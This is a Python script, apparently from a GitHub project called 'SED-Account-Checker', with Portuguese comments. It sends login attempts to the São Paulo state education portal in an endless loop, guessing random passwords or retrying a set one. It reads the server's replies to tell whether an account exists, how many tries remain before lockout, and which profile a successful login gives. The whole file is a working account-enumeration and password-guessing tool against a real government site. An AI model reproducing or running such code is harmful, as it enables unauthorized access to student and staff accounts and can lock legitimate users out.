###  https://github.com/MRvinyKing/SED-Account-Checker
## Projeto Do github 
# Caso goste deixe uma avaliação lá
import requests, random, string, time

####### CONFIGURAÇOES #######
usuario = "rg1234567sp"
senha = "senha" # Deixe a senha em branco para randomizar
tamanho_maximo_da_senha = 10  # Caso você não digite a senha, será criado uma aleatoria com o tamanho maximo definido aqui, minimo 8
delay = 60 # Atraso em segundos entre cada tentativa
caracteres_especiais = ("!", "@", "#")
#############################


def request_checker(usuario, senha, tamanho_maximo_da_senha):
    if senha == "":
        tamanho_da_senha = random.randint(8, tamanho_maximo_da_senha)
        todos_os_caracteres = string.ascii_letters + string.digits + ''.join(caracteres_especiais)
        senha = ''.join(random.choices(todos_os_caracteres, k=tamanho_da_senha))
    url = "https://sed.educacao.sp.gov.br/Logon/LogOn/"
    cookie = ''.join(random.choices(string.ascii_letters + string.digits, k=24))
    headers = {
        "Host": "sed.educacao.sp.gov.br",
    }
    data = {
        "usuario": f"{usuario}",
        "senha": f"{senha}"
    }
    response = requests.post(url, headers=headers, data=data)

    print(f"\n{'='*50}")
    print("Status Code:", response.status_code)
    print(f"Login: {usuario}")
    print(f"Senha: {senha}")
    print("---")

    if response.status_code == 200:
        try:
            response_json = response.json()
            if isinstance(response_json, dict):
                if response_json.get("retorno") == "invalido" and "contador" in response_json:
                    contador = response_json["contador"]
                    if contador  == -97:
                        print("Conta inexistente, Verifique o login...")
                    else:
                        if contador > 0:
                            print(f"{contador} Tentativas até o bloqueio...")
                        else:
                            print(f"Sua conta foi bloqueada  :( ")
            elif isinstance(response_json, list):
                for item in response_json:
                    if "DescricaoPerfil" in item:
                        perfil = item["DescricaoPerfil"]
                        print(f"SUCESSO, PERFIL: {perfil}")
                        break
                else:
                    print("Nenhum perfil encontrado com 'DescricaoPerfil'")
            else:
                print(f"Formato inesperado de resposta: {type(response_json)}")
        except ValueError:
            print("Error: a resposta não foi como esperada")
    else:
        print(f"Erro: status code {response.status_code}")
    print(f"{'='*50}")

while True:
    try:
        request_checker(usuario, senha, tamanho_maximo_da_senha)
        print(f"Proxima tentativa: {delay} s")
        time.sleep(delay)
    except Exception as e:
        print(f"Erro, Tentando novamente: {e}")
        time.sleep(2)
